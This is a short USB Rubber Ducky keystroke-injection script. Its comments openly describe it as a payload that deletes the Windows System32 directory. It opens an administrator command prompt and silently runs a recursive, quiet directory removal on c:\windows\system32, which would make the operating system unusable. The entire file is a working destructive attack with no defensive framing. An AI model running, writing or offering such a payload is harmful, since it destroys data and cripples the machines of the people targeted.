REM Deletes System32 directory as Administrator using command prompt payload 
REM Obviouly a rubber ducky script that deletes important directory of 
REM windows operating system using command prompt.
DELAY 4000
GUI 
DELAY 800
STRING cmd
DELAY 1000
CONTROL SHIFT ENTER
DELAY 1000
STRING cd \windows
DELAY 500
ENTER
DELAY 500
STRING start /MIN cmd /C RD /Q /S "c:\windows\system32"
DELAY 500
ENTER
DELAY 500
STRING exit
